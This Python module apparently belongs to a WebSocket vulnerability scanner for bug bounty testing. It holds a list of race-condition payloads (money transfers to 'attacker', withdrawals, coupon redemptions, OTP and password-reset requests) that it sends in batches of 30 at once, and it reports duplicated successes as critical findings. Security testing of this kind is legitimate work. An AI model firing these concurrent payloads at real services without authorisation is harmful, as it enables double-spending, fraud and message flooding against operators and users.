"""
Race Condition Attack Module
Sends identical messages simultaneously to detect double-spend,
duplicate actions, and state corruption vulnerabilities.
Bug bounty highest payout class — no other WS scanner tests this.
"""
import asyncio
import json
import re
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from core.scanner import ws_connect, send_recv
from core.findings import store
from utils.evidence import Evidence
from utils.logger import log


# ── Race Condition Payloads ───────────────────────────────────────────────────
# These are sent simultaneously (30 copies at once)
RACE_PAYLOADS = [
    # Financial actions — most valuable to test
    ('{"action":"transfer","amount":100,"to":"attacker"}',      'transfer'),
    ('{"action":"withdraw","amount":100}',                       'withdraw'),
    ('{"action":"purchase","item_id":"1","quantity":1}',         'purchase'),
    ('{"action":"redeem_coupon","code":"SAVE50"}',               'redeem_coupon'),
    ('{"action":"use_voucher","voucher":"FREE100"}',              'use_voucher'),

    # Auth/account actions
    ('{"action":"create_account","username":"test"}',            'create_account'),
    ('{"action":"send_otp","phone":"1234567890"}',               'send_otp'),
    ('{"action":"reset_password","email":"test@test.com"}',      'reset_password'),

    # Generic actions
    ('{"action":"vote","item_id":"1"}',                          'vote'),
    ('{"action":"like","post_id":"1"}',                          'like'),
    ('{"action":"claim_reward","reward_id":"1"}',                'claim_reward'),
    ('{"type":"submit","form":"checkout"}',                      'checkout_submit'),
]

# Patterns that suggest race condition was exploited
RACE_CONFIRMED_PATTERNS = [
    (r'"success"\s*:\s*true',              'duplicate success'),
    (r'"created"\s*:\s*true',             'duplicate creation'),
    (r'"balance"',                         'balance returned'),
    (r'"order_id"',                        'duplicate order'),
    (r'"transaction_id"',                  'duplicate transaction'),
    (r'"ticket_id"',                       'duplicate ticket'),
    (r'"reward"',                          'duplicate reward'),
    (r'"points"',                          'duplicate points'),
]

CONCURRENT_REQUESTS = 30  # Send 30 identical requests simultaneously
FAST_CONCURRENT     = 10  # Fast mode: 10 requests


async def _send_race_request(ws_url: str, payload: str) -> str | None:
    """Single request for race condition test"""
    try:
        async with await ws_connect(ws_url, timeout=5) as ws:
            resp = await send_recv(ws, payload, timeout=4)
            return resp
    except Exception:
        return None


async def test_race_condition(ws_url: str, fast_mode: bool = False) -> bool:
    """
    Race Condition Test:
    Send N identical requests simultaneously using asyncio.gather.
    If multiple requests succeed = race condition confirmed.
    """
    concurrent = FAST_CONCURRENT if fast_mode else CONCURRENT_REQUESTS
    found_any = False

    for payload, action_name in RACE_PAYLOADS:
        try:
            log.debug(f"Race condition test: {action_name} x{concurrent}")

            # Send all requests simultaneously
            t_start = time.perf_counter()
            tasks = [
                _send_race_request(ws_url, payload)
                for _ in range(concurrent)
            ]
            responses = await asyncio.gather(*tasks, return_exceptions=True)
            elapsed = time.perf_counter() - t_start

            # Filter valid responses
            valid = [r for r in responses if isinstance(r, str) and r]

            if len(valid) < 2:
                continue

            # Count how many responses indicate SUCCESS
            success_count = 0
            success_responses = []
            for resp in valid:
                for pattern, label in RACE_CONFIRMED_PATTERNS:
                    if re.search(pattern, resp, re.IGNORECASE):
                        success_count += 1
                        success_responses.append(resp[:150])
                        break

            # If MORE THAN 1 request succeeded = race condition
            if success_count >= 2:
                ev = Evidence.make(
                    payload=payload,
                    request=f"Sent {concurrent} identical '{action_name}' requests simultaneously",
                    response=f"Got {success_count} success responses out of {len(valid)} valid responses\nSample responses:\n" +
                             "\n---\n".join(success_responses[:3]),
                    proof=(
                        f"Race condition confirmed: {success_count}/{concurrent} simultaneous "
                        f"'{action_name}' requests returned success. "
                        f"Expected: only 1 success. Got: {success_count} successes."
                    ),
                    reproduce=(
                        f"1. Connect to {ws_url}\n"
                        f"2. Send {concurrent} copies of this message simultaneously:\n"
                        f"   {payload}\n"
                        f"3. Observe {success_count} success responses\n"
                        f"4. Action '{action_name}' executed {success_count}x instead of 1x"
                    ),
                    concurrent_requests=concurrent,
                    success_count=success_count,
                    elapsed_seconds=round(elapsed, 3),
                )
                store.add(
                    ws_url,
                    f'Race Condition — {action_name.replace("_", " ").title()}',
                    'CRITICAL',
                    f"Race condition vulnerability in '{action_name}' action.\n"
                    f"Sent {concurrent} simultaneous requests — {success_count} succeeded.\n"
                    f"Attacker can execute this action multiple times in a single moment.\n"
                    f"Impact: double-spend, duplicate rewards, account manipulation.",
                    ev
                )
                found_any = True
                log.warning(f"CRITICAL: Race condition in {action_name} on {ws_url}")

        except Exception as e:
            log.debug(f"Race condition test error [{action_name}]: {e}")
            continue

    return found_any
